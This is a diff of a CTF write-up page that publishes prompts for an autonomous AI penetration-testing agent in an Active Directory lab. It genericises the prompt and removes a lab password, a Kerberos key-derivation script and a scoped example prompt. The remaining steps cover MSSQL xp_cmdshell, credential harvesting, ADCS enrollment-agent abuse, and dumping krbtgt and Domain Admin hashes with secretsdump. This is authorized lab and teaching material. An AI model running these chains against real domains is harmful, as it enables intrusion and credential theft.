@@ -178,7 +178,7 @@
 
 <div class="wrap hero">
   <div class="kick">CTF · BiotechCorp · Active Directory</div>
-  <h1>From a handed-over <em>e.ross</em> account<br>to Domain Admin in three boxes.</h1>
+  <h1>From a low-privileged account<br>to Domain Admin with <em>ONE AI prompt</em>.</h1>
   <p class="lede">
     My Mac running a Kali VM, an OpenVPN tunnel into the lab, a first host reachable directly —
     then a second network behind it. Click any box or step below to see exactly what I ran and why it worked.
@@ -385,29 +385,14 @@ Add the DC to `/etc/hosts` on Kali as soon as you learn its FQDN — Kerberos ne
 ## OPERATING RULES (these matter more than any tool)
 
 **R1 — Calibrate Kerberos key derivation before you need it.**
-You hold exactly one known plaintext (`e.ross`). Use it to determine this lab's AES convention
-*once*, then reuse it forever:
-
-```python
-from impacket.krb5.crypto import _AES256CTS
-from binascii import hexlify
-
-REALM = "BIOTECHCORP.OFFSEC"
-user, pw = "e.ross", "SilverCometGlass@71"
-
-for enc in ("utf-8", "utf-16-le"):
-    for salt in (REALM + user, user, user.upper()):
-        k = _AES256CTS.string_to_key(pw.encode(enc), salt.encode(enc), b"\x00\x00\x10\x00")
-        print(enc, salt, hexlify(k.contents).decode())
-```
-
-Test each candidate with `impacket-getTGT biotechcorp.offsec/e.ross -aesKey &lt;key&gt;` — the one that
-returns a TGT tells you the convention. Hardcode it. Never guess an encoding again: if a derived
-key returns `PREAUTH_FAILED`, your derivation is wrong, **not** the credential.
+Derive AES keys from the one plaintext credential you hold, across a few encodings and salts
+(`impacket`'s `_AES256CTS.string_to_key`), confirm the winning convention with a single TGT
+request, then reuse it forever. `PREAUTH_FAILED` means the derivation is wrong, **not** the
+credential — never re-guess an encoding.
 
 **R2 — Enumerate permissions before attempting authentication.**
 The first action against AD is a permission sweep, not password guessing:
-`bloodyad -k --host &lt;dc&gt; -d biotechcorp.offsec get writable`, plus full `certipy-ad find`
+`bloodyad -k --host &lt;dc&gt; -d &lt;domain&gt; get writable`, plus full `certipy-ad find`
 (all templates, not just `-vulnerable`). A template can be exploitable through *enrollment rights*
 while `-vulnerable` reports nothing — always resolve who may enrol each template with a
 Certificate Request Agent EKU (`1.3.6.1.4.1.311.20.2.1`) and who is a Certificate Manager.
@@ -418,16 +403,20 @@ Never tune a dead end. Binary blobs (`msDS-ManagedPassword`, encrypted config) g
 attempts; if they resist, pivot to finding the plaintext elsewhere.
 
 **R4 — Shell hygiene — this is where runs silently lose an hour.**
-- Never send inline PowerShell containing quotes or backslashes through evil-winrm.
-- Ship a `.ps1`, run `powershell -ep bypass -nop -f &lt;path&gt;`, then `download` the output.
-- Upload to `C:/Users/&lt;you&gt;/Documents/` — `C:\Users\Public` is often ACL-denied to service accounts.
-- Short one-liners: `powershell -nop -enc &lt;base64 UTF-16LE&gt;`.
+- Never paste quote-heavy or multi-line commands straight into a remote shell (WinRM, SSH, agent
+  consoles). Write a script to a writable path, execute it there, then retrieve the output.
+- Upload to a per-user writable directory (Windows: `C:/Users/&lt;you&gt;/Documents/`); shared spots
+  like `Public` or temp are often ACL-denied to service accounts.
+- For short one-liners prefer a single encoded command over hand-escaped quoting.
 
 **R5 — Invocation defaults (avoids minutes of DNS and NETBIOS stalls).**
-certipy-ad always: `-dc-ip &lt;ip&gt; -dc-host &lt;fqdn&gt; -target &lt;fqdn&gt; -u &lt;user&gt;@biotechcorp.offsec -k -no-pass -ns &lt;ip&gt;`
-(any password write: LDAPS only). impacket always: `-dc-ip &lt;ip&gt;`, `KRB5CCNAME` exported, and a
-`krb5.conf` with `dns_canonicalize_hostname = false`, `rdns = false`, `udp_preference_limit = 1`.
-Wrap every certipy RPC request in `for i in 1 2 3; do ...; done` — the first attempt routinely times out.
+- Name the DC explicitly in every AD tool: `-dc-ip &lt;ip&gt;`, `-dc-host &lt;fqdn&gt;`, `-ns &lt;ip&gt;` where
+  supported — never rely on auto-discovery.
+- Kerberos tooling: export `KRB5CCNAME` and use a `krb5.conf` with `dns_canonicalize_hostname = false`,
+  `rdns = false`, `udp_preference_limit = 1`.
+- Certificate work: Kerberos auth (`-k -no-pass`) wherever NTLM is disabled; LDAPS only for any
+  password write.
+- Wrap flaky RPC-based requests in a 3-attempt loop — the first attempt routinely times out.
 
 **R6 — Credential discipline.**
 Record every credential with its source. Test each one **once** with a single auth to avoid lockout
@@ -447,17 +436,21 @@ one-sentence reason it worked. If a step's output did not prove the claim, say s
 `ip -br a | grep tun0`; `nmap -Pn -sT -sV -p 22,139,445,1433,3389,5985 192.168.197.180`.
 Record open services. Deliverable: service table for host 1.
 
-**P1 — Foothold on 192.168.197.180 with e.ross (~20 min).**
-1. `nxc smb 192.168.197.180 -u e.ross -p '...' --shares --groups` — confirm creds, list shares, groups.
-2. `impacket-mssqlclient BIOTECHCORP.OFFSEC/e.ross:'...'@192.168.197.180 -windows-auth`
-3. Check privilege boundaries before exploiting: `SELECT IS_SRVROLEMEMBER('sysadmin');`
-   `SELECT * FROM fn_my_permissions(NULL,'SERVER');` and impersonation:
-   `SELECT DISTINCT b.name FROM sys.server_permissions a JOIN sys.server_principals b ON a.grantee_principal_id=b.principal_id WHERE a.permission_name='IMPERSONATE';`
-4. If not sysadmin: try `EXECUTE AS LOGIN = ...`, linked servers, then `enable_xp_cmdshell` /
-   `sp_configure 'xp_cmdshell'`. Command execution is the goal; the *route* varies.
-5. On the box: `whoami /all`, `net user`, `net localgroup administrators`, then start P2.
+**P1 — Foothold on host 1 with the initial account (~20 min).**
+1. `nxc smb &lt;host1-ip&gt; -u &lt;user&gt; -p '&lt;pass&gt;' --shares --groups` — confirm the credential, list
+   shares and groups (adapt the protocol to what the credential is actually for).
+2. Authenticate to the exposed service it targets — e.g. MSSQL:
+   `impacket-mssqlclient &lt;DOMAIN&gt;/&lt;user&gt;:'&lt;pass&gt;'@&lt;host1-ip&gt; -windows-auth`.
+3. Check privilege boundaries before exploiting: role membership, effective permissions,
+   impersonation rights. In MSSQL: `IS_SRVROLEMEMBER('sysadmin')`,
+   `fn_my_permissions(NULL,'SERVER')`, and `sys.server_permissions` where
+   `permission_name='IMPERSONATE'`.
+4. If not privileged: impersonation (`EXECUTE AS`), linked servers, then enable the
+   command-execution feature (`xp_cmdshell` and equivalents). Command execution is the goal;
+   the *route* varies.
+5. On the box: `whoami /all`, local users, the local administrators group — then start P2.
 
-**P2 — Harvest credentials on host 1 (~25 min).** Look in this order, cheapest first:
+**P2 — Harvest credentials on the foothold host (~25 min).** Look in this order, cheapest first:
 - Shares you can read: `dir` every share, look for `*.keytab`, `*.kdbx`, `*.config`, `*.ps1`, `*.mof`, `*.xml`, `unattend*`, `*backup*`
 - Keytabs: a keytab is a stored Kerberos credential — extract the key, no cracking needed
   (`from impacket.krb5.keytab import Keytab; Keytab(open(p,'rb').read())` — **bytes, not a path**)
@@ -472,14 +465,14 @@ Start chisel through host 1. Verify: `proxychains4 -q nmap -Pn -sT -p 53,88,135,
 Deliverable: service table for both hosts. Identify the DC (88/389/636) and whether ADCS is present (CA on the DC).
 
 **P4 — AD pathfinding (~25 min).** This is where the run is won or lost. Gather, then rank:
-- `certipy-ad find -u &lt;you&gt; -k -no-pass -dc-ip ... -stdout` → CA name, every template, enrollment
+- If ADCS is present: `certipy-ad find -u &lt;you&gt; -k -no-pass -dc-ip ... -stdout` → CA name, every template, enrollment
   rights, manager-approval flags, EKUs, `Enrollee Supplies Subject`
 - `bloodyad ... get writable` → every object you can modify, and with which right
 - Full LDAP dump of users/groups: `memberOf`, `adminCount`, `servicePrincipalName`,
   `userAccountControl` (flag 514 = disabled — **record it, never target a disabled account with PKINIT**),
-  `msDS-SupportedEncryptionTypes`, `msDS-GroupMSAMembership`, `description`/`info` (labs hide hints there)
+  `msDS-SupportedEncryptionTypes`, `msDS-GroupMSAMembership`, `description`/`info` (hints often hide there)
 - Group membership of: Domain Admins, Certificate Managers, Remote Management Users, Backup Operators
-- Machines you control → any ACE they hold → **two-hop ACL chains are the norm here**
+- Machines you control → any ACE they hold → **two-hop ACL chains are the norm**
 
 Rank candidate paths: (a) ACL edge to a principal that can enrol something (b) ADCS ESC chain
 (c) gMSA you can read (d) delegation. Pick the shortest and pursue it end to end.
@@ -488,11 +481,12 @@ Rank candidate paths: (a) ACL edge to a principal that can enrol something (b) A
 Follow the ranked path. Each hop must be verified with a TGT before you start the next
 (`impacket-getTGT` success = hop confirmed). For ADCS enrollment-agent abuse the shape is:
 enrol the agent template → request a client-auth template **on behalf of** a target → `certipy-ad auth`
-→ ccache + NT hash. Target a **live** Domain Admin (check UAC first), not a disabled built-in account.
+→ ccache + NT hash. Target a **live, enabled** account (check UAC first — PKINIT against a
+disabled account only returns `KDC_ERR_CLIENT_REVOKED`).
 If a hop fails twice, fall back to the next ranked path — do not retry the same edge.
 
 **P6 — Objectives (~10 min).** With DA:
-- WinRM to each host: `evil-winrm -i &lt;host&gt; -r BIOTECHCORP.OFFSEC -K &lt;da.ccache&gt;`
+- WinRM to each host: `evil-winrm -i &lt;host&gt; -r &lt;realm&gt; -K &lt;da.ccache&gt;`
 - `Get-Content C:/Users/Administrator/Desktop/proof.txt`; if absent,
   `Get-ChildItem C:\ -Filter proof.txt -Recurse -Depth 6 -Force -ErrorAction SilentlyContinue`
 - `impacket-secretsdump -k -no-pass -just-dc-ntlm` → record krbtgt + DA hashes + total entry count
@@ -1250,78 +1244,6 @@ evidence decide. Start with connectivity verification and initial enumeration.
 </pre>
     </div>
 
-    <div class="pcard" id="card-condensed">
-      <div class="phead">
-        <div>
-          <h3>03 · Condensed example — filled in for a different lab</h3>
-          <span class="pk">copy, swap the values, paste · 120-minute cap</span>
-        </div>
-        <div class="pacts">
-          <button class="cp" data-copy="p-condensed">copy</button>
-          <a class="cp" href="https://github.com/AV10V/Prompts/blob/main/prompts/03-condensed-example.md" target="_blank" rel="noopener">link</a>
-          <button class="cp" data-hide="card-condensed">hide</button>
-        </div>
-      </div>
-<pre id="p-condensed">ROLE
-You are an autonomous penetration testing agent operating inside an authorized lab.
-Operate as an OSCP-level tester: enumerate first, exploit only on evidence, verify
-everything with real command output, never invent results.
-
-TARGET INFORMATION
-- Targets: 10.129.14.32 (role unknown - confirm by enumeration).
-  Authorized range: 10.129.14.0/24 only.
-- Domain: unknown (must be confirmed by enumeration).
-- Initial credentials: none.
-- VPN: lab tunnel via tun0, attacker 10.10.14.55. No internet from the attacker host.
-- Platform: Kali Linux. Records dir: /root/engagement. Max runtime: 120 minutes.
-- Rate ceiling: nmap -T4, max-rate 1000, no -T5, no domain-wide spraying.
-- Forbidden: password spraying, account lockouts, service restarts, deleting files,
-  anything against 10.129.14.1 (gateway) or outside 10.129.14.0/24.
-
-OBJECTIVE
-Obtain Domain Administrator and retrieve the flag from
-C:\Users\Administrator\Desktop\root.txt. Flag format: [A-Za-z0-9]{32}.
-Success = flag captured plus a verified DA-level command output.
-
-RULES
- 1 Evidence first: every claim comes from output you produced; label Confirmed /
-   Likely / Hypothesis / Failed. A scanner hit is a lead, not a success.
- 2 Enumerate, then decide. Only touch SMB/HTTP/LDAP/Kerberos/RDP/WinRM/MSSQL if
-   they are actually open. No assumed attack chain.
- 3 Records in /root/engagement (scope, hosts, services, identities,
-   credentials.secure.md chmod 600, attack_paths, successful_steps,
-   failed_attempts, environment_changes) and raw output in evidence/NN-tool.txt
-   via tee. Read records before re-enumerating. Secrets stay in the secure file.
- 4 Failure handling: exact error, classify the cause, retry once for a clear
-   execution error, max two attempts per hypothesis, then move on.
- 5 Credentials: source and type, lockout policy before any guessed login, one
-   minimal attempt each, never assume reuse.
- 6 Output hygiene: timeout 300 on network commands, tee raw output, grep the key
-   lines, staged scanning (top 1000 -&gt; all TCP -&gt; UDP 50).
- 7 Pivots only into authorized ranges. Verify connectivity before enumerating.
- 8 Least disruption: no resets, no service changes, no deletions; log every change.
- 9 Scope guard: stop and ask before leaving the authorized range or doing
-   anything destructive or irreversible.
-10 Stop when the objective is verified, the 120-minute cap is hit, or three
-   re-plans produce no new evidence. Deliver a partial report with the blocker.
-
-METHOD
- 0 ip -br addr; ip route; ping; command -v nmap nxc certipy evil-winrm; staged nmap
- 1 per open service: anonymous access, versions, shares, HTTP paths, LDAP bind,
-   RID cycling, SMB signing. Rank initial-access candidates.
- 2 foothold from a ranked candidate, then verify identity and privileges at once
- 3 local enumeration; test escalation only where evidence supports it
- 4 interfaces and routes; confirm any new subnet is in range; tunnel if needed
- 5 AD enumeration plus BloodHound; connect owned principals to privileged objects
- 6 if AD CS exists, certipy find, then verify effective template rights
- 7 execute the best-supported path; verify each hop before the next
- 8 retrieve the flag exactly, prove DA-level access, then stop
-
-FINAL REPORT
- summary | infrastructure | attack chain with commands | credentials | flags |
- findings | failures and limitations | environment changes
-</pre>
-    </div>
   </div>
 
   <div class="note ok" style="margin-top:16px">
